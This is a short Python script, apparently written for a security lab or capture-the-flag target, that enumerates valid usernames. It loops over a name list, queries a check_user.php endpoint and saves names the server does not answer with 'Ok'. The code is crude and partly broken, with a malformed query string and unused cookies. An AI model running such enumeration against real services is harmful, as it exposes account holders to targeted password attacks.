import requests


url = "http://foophones.securitybrigade.com:8080"

params: { "cookie":" //cookie"}

f = open("names.txt", "r")
g = open("validusers.txt", "a")


cookies={ "PHPSESSID":"32u6afp43r4ht6t8ne202lf483"}

for x in f:
	r= requests.get(url+"/check_user.php?="+x)
	print(r.content)
	if "Ok" in str(r.content):
		continue
	else:
		print(str(x) +"is valid")
		g.write(x)
	
'''r= requests.get(url+"/check_user.php?="+f.read(1), cookies=cookies)
print(r.content)'''

